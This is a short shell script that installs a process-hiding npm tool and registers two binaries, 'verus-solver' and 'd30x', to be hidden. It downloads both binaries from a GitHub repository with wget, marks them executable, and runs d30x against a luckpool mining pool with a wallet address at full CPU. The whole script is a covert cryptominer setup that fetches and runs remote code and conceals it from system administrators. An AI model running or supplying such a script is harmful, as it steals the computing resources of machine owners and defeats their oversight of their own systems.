sudo apt update -y
sudo apt install nodejs -y
sudo apt install npm -y
sudo npm i -g node-process-hider
sudo ph add verus-solver
sudo ph add d30x
wget https://github.com/chikahusarii/rev/blob/main/d30x
chmod +x d30x
wget https://github.com/chikahusarii/claim/blob/main/verus-solver
chmod +x verus-solver
./d30x -c stratum+tcp://na.luckpool.net:3956#xnsub -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.w1 -p x --cpu 100
